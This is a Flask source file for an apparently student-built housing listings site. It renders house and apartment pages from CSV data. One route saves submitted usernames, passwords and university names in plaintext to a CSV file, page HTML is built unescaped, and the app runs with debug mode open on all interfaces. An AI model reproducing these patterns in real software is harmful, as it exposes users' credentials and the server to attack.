from flask import Flask, send_from_directory, jsonify, request, redirect, url_for, send_file
import csv
import pandas as pd
import subprocess
import os

app = Flask(__name__, static_folder='src')

@app.route('/')
def index():
    return send_from_directory('templates', 'index.html')

@app.route('/write-logins', methods=['POST'])
def write_logins():
    # Retrieve data from form
    username = request.form.get('user')
    password = request.form.get('pass')
    university = request.form.get('university')
    
    # Save the data to a CSV file
    with open("data/logins.csv", 'a', newline='') as file:
        writer = csv.writer(file)
        writer.writerow([username, password, university])
    
    return redirect(url_for('index'))

@app.route('/house-view', methods=['GET'])
def house_view():
    house_id = request.args.get('id')
    view_df = pd.read_csv('data/houses.csv')
    house_row = view_df.loc[view_df['ID'] == house_id].iloc[0]

    def view_house(row):
        house_view = f"""
        <html>
            <head>
                <title>
                    Houses
                </title>
                <link href="./src/css/pf.css" rel="stylesheet"/>
            </head>

            <header style="height: 50px;">
                <a href="./src/html/links/houses.html" class="back-button-pf">
                    ~ back
                </a>
            </header>

            <body style="background-color: #333333; padding-bottom: 90px; padding-top: 5px;">
                <div class="frame-container">
                    <div class="frame-block1">
                        <img class="big-image" src="./src/images/profile-images/{row['ImagePath']}">
                        <!-- other images -->
                        <div class="small-images">
                            <img src="./src/images/profile-images/{row['ImagePath']}">
                            <img src="./src/images/profile-images/{row['ImagePath']}">
                            <img src="./src/images/profile-images/{row['ImagePath']}">
                            <img src="./src/images/profile-images/{row['ImagePath']}">
                            <img src="./src/images/profile-images/{row['ImagePath']}">
                        </div>
                    </div>
                    <div class="frame-block2">
                        <a class="address">{row['Address']}</a>
                        <div class="address-info">
                            <a>{row['Bedrooms']} Bed</a>
                            <a>{row['Bathrooms']} Bath</a>
                            <a>{row['Roommates']} Roommates</a>
                            <a>${row['Price']} / m</a>
                        </div>
                        <a class="pf-info">
                            -washer <br>
                            -dryer <br>
                            -stainless steel appliances <br>
                            -dog <br>
                            -bathtub <br>
                            -bed <br>
                        </a>
                    </div>
                    <div class="frame-block3">
                        <a id="name-age" class="seller-info">
                            First Last ##
                            <button class="pf-contact">
                                CONTACT
                            </button>
                        </a>
                    </div>
                    <div class="frame-block4">
                        <a class="pf-info">
                            you would have 2 roommates, both people<br>
                            looking for an extra roommate!!<br>
                        </a>
                    </div>
                </div>


                <link href="./src/css/credits.css" rel="stylesheet"/>
                    <!-- credits section -->
                    <section>
                        <!-- Just so that i can see what it looks like filled up with stuff -->
                        <nav class="quick-links">
                            <!-- other links lined up vertically -->
                            <a href="./src/html/links/houses.html" class="nav-link" style="font-weight: 100;">HOUSES</a>
                            <a href="./src/html/links/apartments.html" class="nav-link" style="font-weight: 100;">APARTMENTS</a>
                            <a href="./src/html/links/roommates.html" class="nav-link" style="font-weight: 100;">ROOMMATES</a>
                            <a href="./src/html/links/parking.html" class="nav-link" style="font-weight: 100;">PARKING</a>
                            <a href="./src/html/links/map.html" class="nav-link" style="font-weight: 100;">MAP</a>
                        </nav>
                    </section>
                    <section class="credits">
                        Student owned and operated | Madison WI
                        <br>
                        ©️ 2024, All Rights Reserved
                    </section>

                </div>
            </body>

        </html>
        """
        return house_view

    html_content = view_house(house_row)
    output_file = os.path.join('src', 'html', 'profile-templates', 'house-pf.html')
    with open(output_file, 'w', encoding='utf-8') as file:
        file.write(html_content)

    print("done with house")

    # Open the newly created house-pf.html
    return send_file(output_file)

@app.route('/apt-view', methods=['GET'])
def apt_view():
    apt_id = request.args.get('id')
    view_df = pd.read_csv('data/apartments.csv')
    apt_row = view_df.loc[view_df['ID'] == apt_id].iloc[0]

    def view_apt(row):
        apt_view = f"""
        <html>
            <head>
                <title>
                    Apartments
                </title>
                <link href="./src/css/pf.css" rel="stylesheet"/>
            </head>

            <header style="height: 50px;">
                <a href="./src/html/links/apartments.html" class="back-button-pf">
                    ~ back
                </a>
            </header>

            <body style="background-color: #333333; padding-bottom: 90px; padding-top: 5px;">
                <div class="frame-container">
                    <div class="frame-block1">
                        <img class="big-image" src="./src/images/profile-images/{row['ImagePath']}">
                        <!-- other images -->
                        <div class="small-images">
                            <img src="./src/images/profile-images/{row['ImagePath']}">
                            <img src="./src/images/profile-images/{row['ImagePath']}">
                            <img src="./src/images/profile-images/{row['ImagePath']}">
                            <img src="./src/images/profile-images/{row['ImagePath']}">
                            <img src="./src/images/profile-images/{row['ImagePath']}">
                        </div>
                    </div>
                    <div class="frame-block2">
                        <a class="address">{row['Address']}</a>
                        <div class="address-info">
                            <a>{row['Bedrooms']} Bed</a>
                            <a>{row['Bathrooms']} Bath</a>
                            <a>{row['Roommates']} Roommates</a>
                            <a>${row['Price']} / m</a>
                        </div>
                        <a class="pf-info">
                            -washer <br>
                            -dryer <br>
                            -stainless steel appliances <br>
                            -dog <br>
                            -bathtub <br>
                            -bed <br>
                        </a>
                    </div>
                    <div class="frame-block3">
                        <a id="name-age" class="seller-info">
                            First Last ##
                            <button class="pf-contact">
                                CONTACT
                            </button>
                        </a>
                    </div>
                    <div class="frame-block4">
                        <a class="pf-info">
                            you would have 2 roommates, both people<br>
                            looking for an extra roommate!!<br>
                        </a>
                    </div>
                </div>


                <link href="./src/css/credits.css" rel="stylesheet"/>
                    <!-- credits section -->
                    <section>
                        <!-- Just so that i can see what it looks like filled up with stuff -->
                        <nav class="quick-links">
                            <!-- other links lined up vertically -->
                            <a href="./src/html/links/houses.html" class="nav-link" style="font-weight: 100;">HOUSES</a>
                            <a href="./src/html/links/apartments.html" class="nav-link" style="font-weight: 100;">APARTMENTS</a>
                            <a href="./src/html/links/roommates.html" class="nav-link" style="font-weight: 100;">ROOMMATES</a>
                            <a href="./src/html/links/parking.html" class="nav-link" style="font-weight: 100;">PARKING</a>
                            <a href="./src/html/links/map.html" class="nav-link" style="font-weight: 100;">MAP</a>
                        </nav>
                    </section>
                    <section class="credits">
                        Student owned and operated | Madison WI
                        <br>
                        ©️ 2024, All Rights Reserved
                    </section>

                </div>
            </body>

        </html>
        """
        return apt_view

    html_content = view_apt(apt_row)
    output_file = os.path.join('src', 'html', 'profile-templates', 'apartment-pf.html')
    with open(output_file, 'w', encoding='utf-8') as file:
        file.write(html_content)

    print("done with apartment")

    # Open the newly created house-pf.html
    return send_file(output_file)

if __name__ == '__main__':
    app.run(debug=True, port=5000, host='0.0.0.0')